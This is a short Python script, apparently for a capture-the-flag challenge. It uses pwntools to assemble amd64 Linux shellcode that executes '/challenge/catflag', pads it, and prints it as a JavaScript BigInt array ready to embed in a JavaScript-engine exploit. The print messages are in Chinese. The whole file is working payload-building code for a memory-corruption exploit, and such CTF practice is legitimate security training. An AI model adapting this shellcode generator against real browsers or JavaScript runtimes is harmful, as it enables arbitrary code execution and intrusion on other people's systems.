from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = shellcraft.execve("/challenge/catflag", 0, 0)
output = asm(shellcode)
print(f"Shellcode 长度: {len(output)} 字节")

if len(output) % 8 != 0:
    padding = 8 - (len(output) % 8)
    output += b'\x00' * padding
    print(f"已填充 {padding} 字节，总长度: {len(output)} 字节")

bigint_array = []
for i in range(0, len(output), 8):
    chunk = output[i:i+8]
    value = int.from_bytes(chunk, 'little')
    bigint_array.append(f"{value}n")

js_array = "var shellcode = [\n    " + ",\n    ".join(bigint_array) + "\n];"

print("\nJavaScript BigInt 数组格式:")
print(js_array)